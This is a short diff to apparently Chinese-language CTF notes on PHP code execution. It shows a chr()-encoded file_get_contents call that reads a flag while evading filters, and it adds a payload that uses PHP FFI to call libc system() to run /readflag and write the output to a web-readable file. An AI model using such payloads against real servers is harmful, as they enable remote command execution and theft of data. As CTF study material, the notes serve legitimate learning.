@@ -44,6 +44,12 @@ var_dump(file_get_contents(/flagg')); //打印获取文件的内容。file_get_c
 var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));  //绕过打印flag
 ```
 
+根目录下有/readflag程序
+```
+c=$ffi = FFI::cdef("int system(char *command);", "libc.so.6");$a='/readflag > 1.txt';$ffi->system($a);exit();
+然后访问ip/1.txt
+```
+
 
 ^
 **代码执行函数**
